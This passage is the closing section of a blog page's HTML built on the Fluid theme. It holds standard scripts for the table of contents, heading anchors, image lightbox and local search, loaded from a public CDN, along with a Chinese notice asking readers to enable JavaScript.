    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
